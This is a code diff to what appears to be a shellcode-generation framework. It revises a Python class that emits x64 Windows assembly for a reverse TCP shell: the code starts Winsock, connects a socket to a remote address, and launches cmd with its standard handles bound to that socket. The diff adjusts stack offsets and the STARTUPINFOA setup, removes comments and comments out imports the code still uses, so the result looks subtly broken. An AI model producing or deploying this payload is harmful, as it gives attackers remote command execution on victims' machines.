@@ -15,21 +15,20 @@ from sickle.common.lib.generic.convert import from_str_to_xwords
 from sickle.common.lib.generic.convert import ip_str_to_inet_addr
 from sickle.common.lib.generic.convert import from_str_to_win_hash
 
-from sickle.common.headers.windows.ntdef import _LIST_ENTRY
-from sickle.common.headers.windows.ntdef import _UNICODE_STRING
-from sickle.common.headers.windows.winnt import _IMAGE_DOS_HEADER
-from sickle.common.headers.windows.winnt import _IMAGE_NT_HEADERS64
-from sickle.common.headers.windows.winnt import _IMAGE_EXPORT_DIRECTORY
-from sickle.common.headers.windows.winnt import _IMAGE_OPTIONAL_HEADER64
-from sickle.common.headers.windows.winternl import _PEB
-from sickle.common.headers.windows.winternl import _PEB_LDR_DATA
-from sickle.common.headers.windows.winternl import _LDR_DATA_TABLE_ENTRY
-from sickle.common.headers.windows.winsock2 import AF_INET
-from sickle.common.headers.windows.winsock2 import sockaddr
-from sickle.common.headers.windows.winsock2 import SOCK_STREAM
-from sickle.common.headers.windows.winsock2 import IPPROTO_TCP
-from sickle.common.headers.windows.processthreadsapi import _STARTUPINFOA
-from sickle.common.headers.windows.processthreadsapi import STARTF_USESTDHANDLES
+#from sickle.common.headers.windows.ntdef import _UNICODE_STRING
+#from sickle.common.headers.windows.winnt import _IMAGE_DOS_HEADER
+#from sickle.common.headers.windows.winnt import _IMAGE_NT_HEADERS64
+#from sickle.common.headers.windows.winnt import _IMAGE_EXPORT_DIRECTORY
+#from sickle.common.headers.windows.winnt import _IMAGE_OPTIONAL_HEADER64
+#from sickle.common.headers.windows.winternl import _PEB
+#from sickle.common.headers.windows.winternl import _PEB_LDR_DATA
+#from sickle.common.headers.windows.winternl import _LDR_DATA_TABLE_ENTRY
+#from sickle.common.headers.windows.ws2def import AF_INET
+#from sickle.common.headers.windows.ws2def import sockaddr
+#from sickle.common.headers.windows.ws2def import IPPROTO_TCP
+#from sickle.common.headers.windows.winsock2 import SOCK_STREAM
+#from sickle.common.headers.windows.processthreadsapi import _STARTUPINFOA
+#from sickle.common.headers.windows.processthreadsapi import STARTF_USESTDHANDLES
 
 class Shellcode():
 
@@ -94,14 +93,13 @@ class Shellcode():
         sc_args.update({
             "wsaData"                       : 0x00, 
             "name"                          : 0x00,
-            "lpStartInfo"                   : 0x00,
-        })
+            "lpStartInfo"                   : sizeof(_STARTUPINFOA),
+            "lpCommandLine"                 : len("cmd\x00\x00\x00\x00\x00"),
+            "lpProcessInformation"          : 0x00, 
+       })
 
-        self.stack_space = calc_stack_space(sc_args,
-                                            sizeof(c_uint64))
-
-        self.storage_offsets = gen_offsets(sc_args,
-                                           Shellcode.arch)
+        self.stack_space = calc_stack_space(sc_args, Shellcode.arch)
+        self.storage_offsets = gen_offsets(sc_args, Shellcode.arch)
 
         return
 
@@ -277,20 +275,20 @@ _start:
         shellcode += self.resolve_functions()
         
         shellcode += f"""
-; RAX => WSAStartup([in]  WORD      wVersionRequired, // RCX => MAKEWORD(2, 2) 
-;                   [out] LPWSADATA lpWSAData);       // RDX => &wsaData
+; RAX => WSAStartup([in]  WORD      wVersionRequired, // RCX
+;                   [out] LPWSADATA lpWSAData);       // RDX
 call_WSAStartup:
     mov rcx, 0x202
     lea rdx, [rbp - {self.storage_offsets['wsaData']}]
     mov rax, [rbp - {self.storage_offsets['WSAStartup']}]
     call rax
 
-; RAX => WSASocketA([in] int                 af,              // RCX      => AF_INET
-;                   [in] int                 type,            // RDX      => SOCK_STREAM
-;                   [in] int                 protocol,        // R8       => IPPROTO_TCP
-;                   [in] LPWSAPROTOCOL_INFOA lpProtocolInfo,  // R9       => NULL
-;                   [in] GROUP               g,               // RSP+0x20 => NULL
-;                   [in] DWORD               dwFlags);        // RSP+0x28 => NULL
+; RAX => WSASocketA([in] int                 af,              // RCX
+;                   [in] int                 type,            // RDX
+;                   [in] int                 protocol,        // R8
+;                   [in] LPWSAPROTOCOL_INFOA lpProtocolInfo,  // R9
+;                   [in] GROUP               g,               // RSP+0x20
+;                   [in] DWORD               dwFlags);        // RSP+0x28
 call_WSASocketA:
     mov ecx, {AF_INET}
     mov edx, {SOCK_STREAM}
@@ -302,9 +300,9 @@ call_WSASocketA:
     call rax
     mov rsi, rax ; save the socket file descriptor (sockfd)
 
-; RAX => connect([in] SOCKET s,             // RCX => sockfd (Obtained from WSASocketA)
-;                [in] const sockaddr *name, // RDX => {{ IP | PORT | SIN_FAMILY }}
-;                [in] int namelen);         // R8  => sizeof(sockaddr)
+; RAX => connect([in] SOCKET s,
+;                [in] const sockaddr *name,
+;                [in] int namelen);
 call_connect:
     mov rcx, rax
     mov r8, {sizeof(sockaddr)}
@@ -317,16 +315,15 @@ call_connect:
     call rax
 
 ; [RBX] => typedef struct _STARTUPINFOA {{ }}
-setup_STARTUPINFOA:
-    mov rdi, rbp
-    add rdi, {self.storage_offsets['lpStartInfo']}
+memset_STARTUPINFOA:
+    lea rdi, [rbp - {self.storage_offsets['lpStartInfo']}]  ; RDI = Destination ( memset(rdi, value, x) )
+    mov rbx, rdi                                            ; Backup the pointer to the start of _STARTUPINFOA pointer
+    xor eax, eax                                            ; EAX = 0x00 (value)
+    mov ecx, {int(sizeof(_STARTUPINFOA) / 0x04)}            ; 0x20 * sizeof(DWORD) = (x -> 0x80)
+    rep stosd                                               ; Zero out x bytes
 
-    mov rbx, rdi  ; RDI = Destination ( memset(rdi, value, x) )
-    xor eax, eax  ; EAX = 0x00 (value)
-    mov ecx, 0x20 ; 0x20 * sizeof(DWORD) = (x -> 0x80)
-    rep stosd     ; Zero out x bytes
-
-    mov eax, {sizeof(_STARTUPINFOA)} ; lpStartInfo.cb = sizeof(_STARTUPINFO)
+init_STARTUPINFOA:
+    mov eax, {sizeof(_STARTUPINFOA)}
     mov [rbx], eax
 
     mov eax, {STARTF_USESTDHANDLES}
@@ -335,34 +332,35 @@ setup_STARTUPINFOA:
     mov [rbx + {_STARTUPINFOA.hStdOutput.offset}], rsi
     mov [rbx + {_STARTUPINFOA.hStdError.offset}], rsi
 
-; RAX => CreateProcessA([in, optional]      LPCSTR                lpApplicationName,     // RCX      => NULL
-;                       [in, out, optional] LPSTR                 lpCommandLine,         // RDX      => "cmd"
-;                       [in, optional]      LPSECURITY_ATTRIBUTES lpProcessAttributes,   // R8       => NULL
-;                       [in, optional]      LPSECURITY_ATTRIBUTES lpThreadAttributes,    // R9       => NULL
-;                       [in]                BOOL                  bInheritHandles,       // RSP+0x20 => NULL
-;                       [in]                DWORD                 dwCreationFlags,       // RSP+0x28 => 0x01 (DEBUG_PROCESS)
-;                       [in, optional]      LPVOID                lpEnvironment,         // RSP+0x30 => NULL
-;                       [in, optional]      LPCSTR                lpCurrentDirectory,    // RSP+0x38 => NULL
-;                       [in]                LPSTARTUPINFOA        lpStartupInfo,         // RSP+0x40 => &lpStartupInfo
-;                       [out]               LPPROCESS_INFORMATION lpProcessInformation); // RSP+0x48 => &lpStartupInfo ()
+; RAX => CreateProcessA([in, optional]      LPCSTR                lpApplicationName,     // RCX
+;                       [in, out, optional] LPSTR                 lpCommandLine,         // RDX
+;                       [in, optional]      LPSECURITY_ATTRIBUTES lpProcessAttributes,   // R8
+;                       [in, optional]      LPSECURITY_ATTRIBUTES lpThreadAttributes,    // R9
+;                       [in]                BOOL                  bInheritHandles,       // RSP+0x20
+;                       [in]                DWORD                 dwCreationFlags,       // RSP+0x28
+;                       [in, optional]      LPVOID                lpEnvironment,         // RSP+0x30
+;                       [in, optional]      LPCSTR                lpCurrentDirectory,    // RSP+0x38
+;                       [in]                LPSTARTUPINFOA        lpStartupInfo,         // RSP+0x40
+;                       [out]               LPPROCESS_INFORMATION lpProcessInformation); // RSP+0x48
 call_CreateProccessA:
-    xor ecx, ecx                 ; lpApplicationName
-    mov rdx, rbp                 ; lpCommandLine
-    add rdx, 0x180               ;
-    mov eax, 0x646d63            ; "cmd"
+    xor ecx, ecx
+    mov rdx, rbp
+    lea rdx, [rbp - {self.storage_offsets['lpCommandLine']}]
+    xor rax, rax
+    mov eax, 0x646d63
     mov [rdx], rax
-    xor r8, r8                   ; lpProcessAttributes
-    xor r9, r9                   ; lpThreadAttributes
-    xor eax, eax                 ;
+    xor r8, r8
+    xor r9, r9
+    xor eax, eax
     inc eax
-    mov [rsp + 0x20], rax        ; bInheritHandles
+    mov [rsp + 0x20], rax
     dec eax
-    mov [rsp + 0x28], rax        ; dwCreationFlags
-    mov [rsp + 0x30], rax        ; lpEnvironment
-    mov [rsp + 0x38], rax        ; lpCurrentDirectory
-    mov [rsp + 0x40], rbx        ; lpStartupInfo
-    add rbx, 0x68
-    mov [rsp + 0x48], rbx        ; lpProcessInformation
+    mov [rsp + 0x28], rax
+    mov [rsp + 0x30], rax
+    mov [rsp + 0x38], rax
+    mov [rsp + 0x40], rbx
+    lea rbx, [rbp - {self.storage_offsets['lpProcessInformation']}]
+    mov [rsp + 0x48], rbx
     mov rax, [rbp - {self.storage_offsets['CreateProcessA']}]
     call rax
 
@@ -372,7 +370,7 @@ call_TerminateProcess:
 	xor rcx, rcx
 	dec rcx
 	xor rdx, rdx
-	mov rax, [r15 + {self.storage_offsets['TerminateProcess']}]
+	mov rax, [rbp - {self.storage_offsets['TerminateProcess']}]
 	call rax
 
 fin:
